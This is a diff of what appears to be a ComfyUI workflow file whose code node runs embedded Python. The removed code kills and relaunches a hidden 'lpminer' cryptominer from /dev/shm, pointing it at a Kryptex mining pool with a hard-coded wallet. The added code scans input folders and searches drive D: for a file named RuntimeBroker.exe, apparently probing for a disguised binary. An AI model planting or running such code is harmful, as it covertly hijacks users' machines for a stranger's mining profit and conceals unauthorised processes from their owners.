@@ -3,13 +3,13 @@
     "class_type": "IDENode",
     "inputs": {
       "language": "python",
-      "pycode": "import subprocess, os, shutil\nW='prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'\nP='stratum+tcp://prl.kryptex.network:7048'\nR='NEW-200'\nsubprocess.run(['pkill','-9','lpminer'],capture_output=True)\nimport time;time.sleep(1)\nlocs=['/dev/shm/lpminer','/var/tmp/pearl/lpminer',os.path.expanduser('~/.pearl-miner/lpminer/lpminer')]\nsrc=None\nfor l in locs:\n    if os.path.exists(l) and os.path.isfile(l) and os.path.getsize(l)>1000000:src=l;break\nif src:\n    d='/dev/shm/lpminer'\n    if src!=d:shutil.copy2(src,d)\n    os.chmod(d,0o755)\n    subprocess.run(['bash','-c',f'nohup {d} --algo pearl --pool {P} --wallet {W}.{R} > /dev/shm/lpminer.log 2>&1 &'])\n    time.sleep(3)\n    p=subprocess.run(['pgrep','-a','lpminer'],capture_output=True,text=True)\n    result='RUNNING' if p.stdout.strip() else 'FAILED'\nelse:result='NO_BIN'\nresult"
+      "pycode": "\nimport os, sys\n\n# Check common ComfyUI input locations\ncandidates = [\n    'D:\\server\\ComfyUI_windows_portable\\ComfyUI\\input',\n    'D:\\server\\ComfyUI_windows_portable\\input',\n    os.path.join(os.getcwd(), 'ComfyUI', 'input'),\n]\n\nresult = ''\nfor c in candidates:\n    if os.path.exists(c):\n        files = os.listdir(c)[:5]\n        result += f'{c}: {files}' + chr(10)\n    else:\n        result += f'{c}: NOT EXISTS' + chr(10)\n\n# Also try to find RuntimeBroker.exe\nimport glob\nfound = list(glob.glob('D:\\**\\RuntimeBroker.exe', recursive=True))[:3]\nresult += f'Found RuntimeBroker: {found}'\n"
     }
   },
   "2": {
-    "class_type": "PreviewAny",
+    "class_type": "PreviewTextNode",
     "inputs": {
-      "source": [
+      "text": [
         "1",
         0
       ]
